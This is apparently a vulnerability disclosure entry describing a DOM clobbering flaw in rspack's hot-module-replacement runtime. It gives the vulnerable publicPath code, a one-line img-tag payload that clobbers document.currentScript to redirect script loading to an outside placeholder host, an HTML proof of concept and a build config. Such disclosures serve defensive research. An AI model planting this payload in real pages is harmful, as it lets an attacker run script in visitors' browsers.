## Webpack

### Meta

+ Library: rspack
+ Stars: 8.6K
+ Version: v1.0.0-rc.0
+ Fingerprint: N/A
+ Payload: ```<img name="currentScript" src="https://xxx.xxxx.xxx"></img>```
+ Impact: XSS
+ CVE: N/A
+ Foundby: TheHulk

### Library

URL: Self hosted

### Vulnerable Code Snippet

`crates/rspack_plugin_hmr/src/runtime/hot_module_replacement.js`
```javascript
(()=>{
        t.g.importScripts && (e = t.g.location + "");
        var e, r = t.g.document;
        if (!e && r && (r.currentScript && (e = r.currentScript.src),
        !e)) {
            var n = r.getElementsByTagName("script");
            if (n.length) {
                for (var o = n.length - 1; o > -1 && (!e || !/^http(s?):/.test(e)); )
                    e = n[o--].src
            }
        }
        if (!e)
            throw Error("Automatic publicPath is not supported in this browser");
        e = e.replace(/#.*$/, "").replace(/\?.*$/, "").replace(/\/[^\/]+$/, "/"),
        t.p = e
    }
    )()
```

## PoC

```
<!doctype html>
  <html lang="en"><head><meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <title>Document</title>
</head>
<body>
  <div id="root"><img name="currentScript" src="https://xxx.xxx.xxx">
  <script defer src="./dist/main.bundle.js"></script>
  </div>
</body>
</html>
```

The `rspack.config.js` to generate the bundle can be found below. 

```
const rspack = require('@rspack/core');
const path = require('path');
/** @type {import('@rspack/cli').Configuration} */
module.exports = {
  entry: {
    main: './src/index.js',
  },
  output: {
    path: path.resolve(__dirname, 'dist'),
    filename: '[name].bundle.js',
    chunkFilename: '[id].bundle.js',
    publicPath: 'auto',
  },
  plugins: [
    new rspack.HtmlRspackPlugin({
      template: './poc.html',
    }),
  ],
  optimization: {
    splitChunks: {
      chunks: 'all',
    },
  },
};
```